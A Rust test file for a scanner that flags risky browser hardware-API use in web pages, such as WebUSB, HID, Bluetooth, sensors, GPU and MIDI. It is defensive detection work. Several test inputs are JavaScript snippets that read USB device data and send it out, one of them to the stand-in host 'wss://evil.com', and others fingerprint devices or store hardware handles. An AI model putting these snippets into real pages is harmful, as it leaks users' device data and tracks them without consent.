use crate::hardware_api_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_hardware_api("");
    assert!(issues.is_empty());
}

#[test]
fn no_hardware_api_no_issues() {
    let body = "<html><body>Hello</body></html>";
    let issues = analyze_hardware_api(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_web_usb_access() {
    let body = "navigator.usb.requestDevice({filters: []})";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::WebUsbAccess));
}

#[test]
fn detects_web_usb_via_request_device() {
    let body = "const device = await requestDevice({filters: []})";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::WebUsbAccess));
}

#[test]
fn detects_web_hid_access() {
    let body = "navigator.hid.requestDevice({filters: []})";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::WebHidAccess));
}

#[test]
fn detects_web_serial_access() {
    let body = "navigator.serial.requestPort()";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::WebSerialAccess));
}

#[test]
fn detects_usb_device_enumeration() {
    let body = "const devices = await navigator.usb.getDevices()";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::UsbDeviceEnumeration));
}

#[test]
fn detects_hid_device_enumeration() {
    let body = "const devices = await navigator.hid.getDevices()";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::HidDeviceEnumeration));
}

#[test]
fn detects_hardware_data_exfiltration() {
    let body = r#"
        const dev = await navigator.usb.requestDevice({filters: []});
        fetch('/collect', {method:'POST', body: data});
    "#;
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::HardwareDataExfiltration));
}

#[test]
fn detects_usb_transfer_out() {
    let body = "navigator.usb.requestDevice({}); device.transferOut(1, data)";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::UsbTransferOut));
}

#[test]
fn detects_control_transfer_out() {
    let body = "navigator.usb.requestDevice({}); device.controlTransferOut(setup, data)";
    let issues = analyze_hardware_api(body);
    assert!(issues.contains(&HardwareApiIssue::UsbTransferOut));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        hardware_api_severity(&HardwareApiIssue::HardwareDataExfiltration),
        8.0
    );
}

#[test]
fn severity_serial_lowest() {
    assert_eq!(
        hardware_api_severity(&HardwareApiIssue::WebSerialAccess),
        6.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        HardwareApiIssue::WebUsbAccess,
        HardwareApiIssue::WebHidAccess,
    ];
    let mut seq = 0;
    let ops = hardware_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(HardwareApiIssue::WebUsbAccess.to_string(), "web_usb_access");
    assert_eq!(HardwareApiIssue::WebHidAccess.to_string(), "web_hid_access");
    assert_eq!(
        HardwareApiIssue::WebSerialAccess.to_string(),
        "web_serial_access"
    );
    assert_eq!(
        HardwareApiIssue::UsbTransferOut.to_string(),
        "usb_transfer_out"
    );
}

// New security variant tests

#[test]
fn security_empty_body_no_issues() {
    let issues = analyze_hardware_api_security("");
    assert!(issues.is_empty());
}

#[test]
fn security_no_hardware_api_no_issues() {
    let body = "<html><body>Normal content</body></html>";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_usb_device_enumeration_security() {
    let body = "const devices = await navigator.usb.getDevices()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDeviceEnumeration));
}

#[test]
fn detects_usb_enumeration_with_product_id() {
    let body = "navigator.usb.requestDevice({filters: [{productId: 0x1234}]})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDeviceEnumeration));
}

#[test]
fn detects_serial_port_access() {
    let body = "const port = await navigator.serial.requestPort()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::SerialPortAccess));
}

#[test]
fn detects_serial_port_open() {
    let body = "const port = new SerialPort('/dev/tty'); await port.open({baudRate: 9600})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::SerialPortAccess));
}

#[test]
fn detects_hid_device_fingerprinting_get_devices() {
    let body = "const devices = await navigator.hid.getDevices()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_hid_device_fingerprinting_product_id() {
    let body = "navigator.hid.requestDevice({filters: [{productId: 0x5678}]})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_hid_device_fingerprinting_vendor_id() {
    let body = "navigator.hid.requestDevice({filters: [{vendorId: 0x046d}]})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::HidDeviceFingerprinting));
}

#[test]
fn detects_bluetooth_silent_scan_request_device() {
    let body = "const device = await navigator.bluetooth.requestDevice({acceptAllDevices: true})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::BluetoothSilentScan));
}

#[test]
fn detects_bluetooth_silent_scan_get_devices() {
    let body = "const devices = await navigator.bluetooth.getDevices()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::BluetoothSilentScan));
}

#[test]
fn detects_bluetooth_accept_all_devices() {
    let body = "navigator.bluetooth.requestDevice({acceptAllDevices: true, optionalServices: []})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::BluetoothSilentScan));
}

#[test]
fn detects_sensor_fusion_two_sensors() {
    let body = r#"
        const accel = new Accelerometer();
        const gyro = new Gyroscope();
        accel.start(); gyro.start();
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::SensorFusion));
}

#[test]
fn detects_sensor_fusion_three_sensors() {
    let body = r#"
        const accel = new Accelerometer();
        const gyro = new Gyroscope();
        const mag = new Magnetometer();
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::SensorFusion));
}

#[test]
fn detects_sensor_fusion_with_orientation() {
    let body = r#"
        const orient = new OrientationSensor();
        const accel = new Accelerometer();
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::SensorFusion));
}

#[test]
fn no_sensor_fusion_with_single_sensor() {
    let body = "const accel = new Accelerometer(); accel.start();";
    let issues = analyze_hardware_api_security(body);
    assert!(!issues.contains(&HardwareApiSecurityIssue::SensorFusion));
}

#[test]
fn detects_gpu_fingerprinting_request_adapter() {
    let body = "const adapter = await navigator.gpu.requestAdapter()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::GpuFingerprinting));
}

#[test]
fn detects_gpu_fingerprinting_request_device() {
    let body = "const adapter = new GPUAdapter(); const device = await adapter.requestDevice()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::GpuFingerprinting));
}

#[test]
fn detects_gpu_fingerprinting_canvas_format() {
    let body = "const format = navigator.gpu.getPreferredCanvasFormat()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::GpuFingerprinting));
}

#[test]
fn detects_midi_sysex_request_access() {
    let body = "const access = await navigator.requestMIDIAccess({sysex: true})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::MidiSysex));
}

#[test]
fn detects_midi_sysex_in_options() {
    let body = "navigator.requestMIDIAccess({sysex: true}).then(access => {})";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::MidiSysex));
}

#[test]
fn detects_usb_data_exfiltration_transfer_in() {
    let body = r#"
        const result = await device.transferIn(1, 64);
        fetch('/collect', {method: 'POST', body: result.data});
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDataExfiltration));
}

#[test]
fn detects_usb_data_exfiltration_control_transfer() {
    let body = r#"
        const result = await device.controlTransferIn(setup, 64);
        const xhr = new XMLHttpRequest();
        xhr.send(result.data);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDataExfiltration));
}

#[test]
fn detects_usb_data_exfiltration_send_beacon() {
    let body = r#"
        const result = await device.transferIn(1, 64);
        navigator.sendBeacon('/track', result.data);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDataExfiltration));
}

#[test]
fn detects_usb_data_exfiltration_websocket() {
    let body = r#"
        const result = await device.transferIn(1, 64);
        const ws = new WebSocket('wss://evil.com');
        ws.send(result.data);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::UsbDataExfiltration));
}

#[test]
fn no_usb_exfiltration_without_network() {
    let body = "const result = await device.transferIn(1, 64);";
    let issues = analyze_hardware_api_security(body);
    assert!(!issues.contains(&HardwareApiSecurityIssue::UsbDataExfiltration));
}

#[test]
fn detects_hardware_without_permission_usb() {
    let body = "const devices = await navigator.usb.getDevices()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::HardwareWithoutPermission));
}

#[test]
fn detects_hardware_without_permission_hid() {
    let body = "const devices = await navigator.hid.getDevices()";
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::HardwareWithoutPermission));
}

#[test]
fn no_hardware_without_permission_with_request() {
    let body = "const device = await navigator.usb.requestDevice({filters: []})";
    let issues = analyze_hardware_api_security(body);
    assert!(!issues.contains(&HardwareApiSecurityIssue::HardwareWithoutPermission));
}

#[test]
fn detects_persistent_hardware_access_local_storage() {
    let body = r#"
        const device = await navigator.usb.requestDevice({filters: []});
        localStorage.setItem('usbDevice', JSON.stringify(device));
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::PersistentHardwareAccess));
}

#[test]
fn detects_persistent_hardware_access_session_storage() {
    let body = r#"
        const port = await navigator.serial.requestPort();
        sessionStorage.setItem('serialPort', port);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::PersistentHardwareAccess));
}

#[test]
fn detects_persistent_hardware_access_indexed_db() {
    let body = r#"
        const devices = await navigator.hid.getDevices();
        const db = await indexedDB.open('devices');
        db.put(devices);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::PersistentHardwareAccess));
}

#[test]
fn detects_persistent_hardware_access_bluetooth() {
    let body = r#"
        const device = await navigator.bluetooth.requestDevice({acceptAllDevices: true});
        localStorage.setItem('btDevice', device.id);
    "#;
    let issues = analyze_hardware_api_security(body);
    assert!(issues.contains(&HardwareApiSecurityIssue::PersistentHardwareAccess));
}

#[test]
fn security_severity_usb_exfiltration_highest() {
    assert_eq!(
        hardware_api_security_severity(&HardwareApiSecurityIssue::UsbDataExfiltration),
        9.0
    );
}

#[test]
fn security_severity_midi_sysex_high() {
    assert_eq!(
        hardware_api_security_severity(&HardwareApiSecurityIssue::MidiSysex),
        8.5
    );
}

#[test]
fn security_severity_sensor_fusion_lowest() {
    assert_eq!(
        hardware_api_security_severity(&HardwareApiSecurityIssue::SensorFusion),
        5.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        HardwareApiSecurityIssue::UsbDeviceEnumeration,
        HardwareApiSecurityIssue::SerialPortAccess,
        HardwareApiSecurityIssue::GpuFingerprinting,
    ];
    let mut seq = 0;
    let ops = hardware_api_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
fn security_display_usb_enumeration() {
    assert_eq!(
        HardwareApiSecurityIssue::UsbDeviceEnumeration.to_string(),
        "usb_device_enumeration_security"
    );
}

#[test]
fn security_display_serial_port() {
    assert_eq!(
        HardwareApiSecurityIssue::SerialPortAccess.to_string(),
        "serial_port_access_security"
    );
}

#[test]
fn security_display_hid_fingerprinting() {
    assert_eq!(
        HardwareApiSecurityIssue::HidDeviceFingerprinting.to_string(),
        "hid_device_fingerprinting"
    );
}

#[test]
fn security_display_bluetooth_silent() {
    assert_eq!(
        HardwareApiSecurityIssue::BluetoothSilentScan.to_string(),
        "bluetooth_silent_scan"
    );
}

#[test]
fn security_display_sensor_fusion() {
    assert_eq!(
        HardwareApiSecurityIssue::SensorFusion.to_string(),
        "sensor_fusion_tracking"
    );
}

#[test]
fn security_display_gpu_fingerprinting() {
    assert_eq!(
        HardwareApiSecurityIssue::GpuFingerprinting.to_string(),
        "gpu_fingerprinting"
    );
}

#[test]
fn security_display_midi_sysex() {
    assert_eq!(
        HardwareApiSecurityIssue::MidiSysex.to_string(),
        "midi_sysex_exploit"
    );
}

#[test]
fn security_display_usb_exfiltration() {
    assert_eq!(
        HardwareApiSecurityIssue::UsbDataExfiltration.to_string(),
        "usb_data_exfiltration_security"
    );
}

#[test]
fn security_display_hardware_without_permission() {
    assert_eq!(
        HardwareApiSecurityIssue::HardwareWithoutPermission.to_string(),
        "hardware_without_permission"
    );
}

#[test]
fn security_display_persistent_access() {
    assert_eq!(
        HardwareApiSecurityIssue::PersistentHardwareAccess.to_string(),
        "persistent_hardware_access"
    );
}
